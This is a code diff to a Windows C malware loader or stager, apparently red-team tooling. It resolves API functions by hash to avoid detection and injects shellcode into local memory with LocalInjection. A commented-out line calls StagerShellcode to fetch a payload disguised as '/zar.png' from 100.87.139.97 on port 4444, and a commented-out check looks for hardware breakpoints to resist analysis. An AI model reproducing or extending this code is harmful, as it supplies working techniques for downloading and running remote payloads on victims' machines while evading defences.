@@ -22,8 +22,10 @@ INT WINAPI WinMain(
 
     if ( HwbpCheck() ) return;
 */
-
-    LocalInjection( BlackoutBytes, sizeof( BlackoutBytes ) );
+//    PVOID  BlackoutBytes = NULL;
+//    UINT64 BlackoutSize  = 0;
+//    StagerShellcode( L"100.87.139.97", 4444, L"/zar.png", FALSE, L"GET", NULL, NULL, &BlackoutBytes, &BlackoutSize );
+    LocalInjection( BlackoutBytes, BlackoutSize );
 }
 
 BOOL InitInstance(
@@ -38,7 +40,6 @@ BOOL InitInstance(
 
     Instance.Win32.LoadLibraryA        = LdrFuncAddr( Kernel32, HASH_STR( "LoadLibraryA" ) );
 
-    //Cryptsp = Instance.Win32.LoadLibraryA( "cryptsp.dll" );
     Winhttp = Instance.Win32.LoadLibraryA( "winhttp.dll" );
 
     Instance.Win32.LoadLibraryExA      = LdrFuncAddr( Kernel32, HASH_STR( "LoadLibraryExA" ) );
@@ -60,12 +61,11 @@ BOOL InitInstance(
     Instance.Win32.WinHttpReceiveResponse   = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpReceiveResponse" ) );
     Instance.Win32.WinHttpSetOption         = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpSetOption" ) );
     Instance.Win32.WinHttpSendRequest       = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpSendRequest" ) );
+    Instance.Win32.WinHttpCloseHandle       = LdrFuncAddr( Winhttp,  HASH_STR( "WinHttpCloseHandle" ) );
 
     Instance.Win32.LocalAlloc               = LdrFuncAddr( Kernel32,  HASH_STR( "LocalAlloc" ) );
     Instance.Win32.LocalReAlloc             = LdrFuncAddr( Kernel32,  HASH_STR( "LocalReAlloc" ) );
     Instance.Win32.LocalFree                = LdrFuncAddr( Kernel32,  HASH_STR( "LocalFree" ) );
-
-    Instance.InjectionTechnique = INJECTION_TECHNIQUE;
 
     return TRUE;
 }
